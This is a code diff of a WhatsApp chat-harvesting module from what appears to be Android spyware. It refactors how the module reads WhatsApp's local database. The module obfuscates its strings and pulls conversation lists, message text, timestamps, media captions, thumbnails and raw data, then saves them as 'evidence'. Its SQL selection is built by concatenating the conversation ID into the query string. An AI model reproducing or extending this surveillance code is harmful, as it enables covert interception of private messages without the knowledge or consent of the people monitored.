@@ -207,13 +207,10 @@ public class ChatWhatsapp extends SubModuleChat {
 					}
 					return;
 				}
-				SQLiteDatabase db = null;
 				try {
-					 db = helper.getReadableDatabase();
-
 					// retrieve a list of all the conversation changed from the last
 					// reading. Each conversation contains the peer and the last id
-					ArrayList<String> changedConversations = fetchConversation(db, lastWhatsapp);
+					ArrayList<String> changedConversations = fetchConversation(helper, lastWhatsapp);
 					// helper.disposeDb();
 
 					// helper = GenericSqliteHelper.open(dbDir, dbFile);
@@ -227,7 +224,7 @@ public class ChatWhatsapp extends SubModuleChat {
 								fetchGroup(helper, conversation);
 							}
 
-							long conversationLastRead = fetchMessages(db, conversation, lastWhatsapp);
+							long conversationLastRead = fetchMessages(helper, conversation, lastWhatsapp);
 							newLastRead = Math.max(conversationLastRead, newLastRead);
 
 							if (Cfg.DEBUG) {
@@ -249,17 +246,6 @@ public class ChatWhatsapp extends SubModuleChat {
 					}
 				}finally {
 					helper.disposeDb();
-					if(db!=null && db.isOpen()){
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (readChatMessages) closing db pointer");
-						}
-						db.close();
-						db=null;
-					}else{
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (readChatMessages) no need to close db pointer");
-						}
-					}
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -303,33 +289,18 @@ public class ChatWhatsapp extends SubModuleChat {
 		helper.traverseRecords(M.e("messages"), visitor, true);
 
 	}
+	private class FetchConversationRecordVisitor extends RecordVisitor {
+		long lastRead =0;
+		ArrayList<String> changedConversations = new ArrayList<String>();
+		private FetchConversationRecordVisitor(long lr,String[] projection, String selection, String order) {
+			super(projection, selection, order);
+			lastRead = lr;
 
-	/**
-	 * Retrieves the list of the conversations and their last read message.
-	 *
-	 * @param db
-	 * @return
-	 */
-	private ArrayList<String> fetchConversation(SQLiteDatabase db, long lastWhatsapp) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (fetchChangedConversation)");
 		}
 
-		ArrayList<String> changedConversations = new ArrayList<String>();
-		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		// f.3=chat_list
-		queryBuilderIndex.setTables(M.e("chat_list"));
-		queryBuilderIndex.appendWhere(M.e("sort_timestamp > ") + lastWhatsapp);
 
-		// queryBuilder.appendWhere(inWhere);
-		// f.4=_id
-		// f.5=key_remote_jid
-		// f.6=message_table_id
-		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id") };
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.e("sort_timestamp ASC"));
-
-		// iterate conversation indexes
-		while (cursor != null && cursor.moveToNext()) {
+		@Override
+		public long cursor(Cursor cursor) {
 			// f.5=key_remote_jid
 			String jid = cursor.getString(cursor.getColumnIndexOrThrow(M.e("key_remote_jid")));
 			// f.6=message_table_id
@@ -344,51 +315,52 @@ public class ChatWhatsapp extends SubModuleChat {
 			if (lastReadIndex < mid) {
 				changedConversations.add(jid);
 			}
-
+			return lastRead;
 		}
-		cursor.close();
-		return changedConversations;
-	}
 
+		public ArrayList<String> getChangedConversations() {
+			return changedConversations;
+		}
+	}
 	/**
-	 * Fetch unread messages of a specific conversation
-	 * 
-	 * @param db
-	 * @param conversation
+	 * Retrieves the list of the conversations and their last read message.
+	 *
+	 * @param helper
 	 * @return
 	 */
-	private long fetchMessages(SQLiteDatabase db, String conversation, long lastWhatsapp) {
+	private ArrayList<String> fetchConversation(GenericSqliteHelper helper , long lastWhatsapp) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (fetchMessages): " + conversation + " : lsw" + lastWhatsapp);
+			Check.log(TAG + " (fetchChangedConversation)");
 		}
-
-		String peer = clean(conversation);
-
-		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		// f.a=messages
-		queryBuilderIndex.setTables(M.e("messages"));
+		// f.3=chat_list
+		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id") };
+		//StringUtils.split(M.e("_id,keyr") )
+		// queryBuilder.appendWhere(inWhere);
 		// f.4=_id
 		// f.5=key_remote_jid
-		queryBuilderIndex.appendWhere(M.e("key_remote_jid") + " = '" + conversation + "' AND " + M.e("timestamp") + " > "
-				+ lastWhatsapp);
-		// f.7=data
-		// f_b=timestamp
-		// f_c=key_from_me
-		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),M.e("remote_resource"),
-				M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"),M.e("thumb_image"), M.e("raw_data"),M.e("media_size")
-		};
+		// f.6=message_table_id
+		FetchConversationRecordVisitor fcsrv = new FetchConversationRecordVisitor(lastWhatsapp,projection,M.e("sort_timestamp > ") + lastWhatsapp,M.e("sort_timestamp ASC"));
+		lastWhatsapp = helper.traverseRecords(M.e("chat_list") , fcsrv);
+		return fcsrv.getChangedConversations();
+	}
+
+	private class FetchMessagesRecordVisitor extends RecordVisitor {
+		long lastRead =0;
+		String peer = "";
+		private ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
+		private ArrayList<MessageChatMultimedia> multimedias = new ArrayList<MessageChatMultimedia>();
+		private FetchMessagesRecordVisitor(String peer,long lr,String[] projection, String selection, String order) {
+			super(projection, selection, order);
+			lastRead = lr;
+			this.peer = peer;
+		}
 
 
-		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
-		// AND key_remote_jid>$lastReadIndex
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.e("timestamp"));
-
-		ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
-		ArrayList<MessageChatMultimedia> multimedias = new ArrayList<MessageChatMultimedia>();
-		long lastRead = lastWhatsapp;
-		while (cursor != null && cursor.moveToNext()) {
+		@Override
+		public long cursor(Cursor cursor) {
 			boolean is_mm = false;
 			int index = cursor.getInt(0); // f_4
+			String conversation = cursor.getString(1); // f_7
 			String message = cursor.getString(2); // f_7
 			Long timestamp = cursor.getLong(3); // f_b
 			boolean incoming = cursor.getInt(4) != 1; // f_
@@ -438,10 +410,10 @@ public class ChatWhatsapp extends SubModuleChat {
 
 			/* it can be a multimedia message , don't skip it only for message == empty*/
 			if (StringUtils.isEmpty(message) && (mm_wa_type<1 || mm_wa_type > 4) ) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (fetchMessages), empty message");
-					}
-					continue;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchMessages), empty message");
+				}
+				return lastRead;
 			}
 			if((mm_wa_type>=1 && mm_wa_type <= 3)){
 				is_mm = true;
@@ -497,17 +469,45 @@ public class ChatWhatsapp extends SubModuleChat {
 				}
 
 			} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (fetchMessages) Error, null values");
-					}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchMessages) Error, null values");
+				}
 			}
 
+			return lastRead;
 		}
-		cursor.close();
-		getModule().saveEvidence(messages);
-		getModule().saveEvidenceMultimedia(multimedias);
-		messages = null;
-		multimedias = null;
+
+		public ArrayList<MessageChat> getMessages() {
+			return messages;
+		}
+
+		public ArrayList<MessageChatMultimedia> getMultimedias() {
+			return multimedias;
+		}
+	}
+	/**
+	 * Fetch unread messages of a specific conversation
+	 * 
+	 * @param helper
+	 * @param conversation
+	 * @return
+	 */
+	private long fetchMessages(GenericSqliteHelper helper , String conversation, long lastWhatsapp) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (fetchMessages): " + conversation + " : lsw" + lastWhatsapp);
+		}
+		String peer = clean(conversation);
+		String selection = M.e(" key_remote_jid = '") + conversation + M.e("' AND timestamp > ")+lastWhatsapp ;
+
+		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),M.e("remote_resource"),
+				M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"),M.e("thumb_image"), M.e("raw_data"),M.e("media_size")
+		};
+		long lastRead = lastWhatsapp;
+		FetchMessagesRecordVisitor fmsrv = new FetchMessagesRecordVisitor(peer,lastRead,projection,selection,M.e("timestamp"));
+		lastRead = helper.traverseRecords(M.e("messages"), fmsrv);
+		getModule().saveEvidence(fmsrv.getMessages());
+		getModule().saveEvidenceMultimedia(fmsrv.getMultimedias());
+		fmsrv = null;
 		System.gc();
 		return lastRead;
 	}
